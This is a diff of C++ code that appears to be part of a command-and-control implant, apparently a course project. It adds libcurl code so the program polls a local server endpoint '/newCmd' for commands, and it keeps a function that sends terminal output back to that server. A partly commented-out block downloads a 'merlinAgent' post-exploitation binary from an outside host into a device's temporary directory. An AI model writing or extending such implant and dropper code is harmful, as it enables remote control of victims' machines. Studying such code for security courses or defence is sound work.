@@ -22,9 +22,18 @@ string get_os_name() {
     #endif
 }
 
-size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+size_t write_data_file(void *ptr, size_t size, size_t nmemb, FILE *stream) {
     size_t written = fwrite(ptr, size, nmemb, stream);
     return written;
+}
+
+static string readBuffer;
+size_t write_data(char *ptr, size_t size, size_t nmemb, string *stream) {
+    for (int i = 0; i<size*nmemb; i++)
+    {
+        readBuffer.push_back(ptr[i]);
+    }
+    return size * nmemb;
 }
 
 void download_file(string url, string location) {
@@ -35,7 +44,7 @@ void download_file(string url, string location) {
     if (curl) {
         fp = fopen(location.c_str(), "wb");
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data_file);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
         res = curl_easy_perform(curl);
         curl_easy_cleanup(curl);
@@ -71,28 +80,34 @@ string get_command()
     if(curl){
         string response_string;
         string header_string;
+        readBuffer.clear();
         curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/newCmd");
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
         curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
-        cout << response_string << endl;
-        cout << header_string << endl;
 
         curl_easy_perform(curl);
         curl_easy_cleanup(curl);
         curl = NULL;
     }
+
+    return readBuffer;
 }
 
 int main() {
     string os_name = get_os_name();
     cout << os_name << endl;
 
-    string testOutput;
-    send_terminal_back(1, "This is a test message");
+    //Post Test
+    //string testOutput;
+    //send_terminal_back(1, "This is a test message");
 
 
-    if (os_name == "Android") {
+    //Get Test
+    string outputTest = get_command();
+    cout << outputTest << endl;
+
+    if (os_name == "Linux") {
         /*string merlin = "/data/local/tmp/merlin";
 
         download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
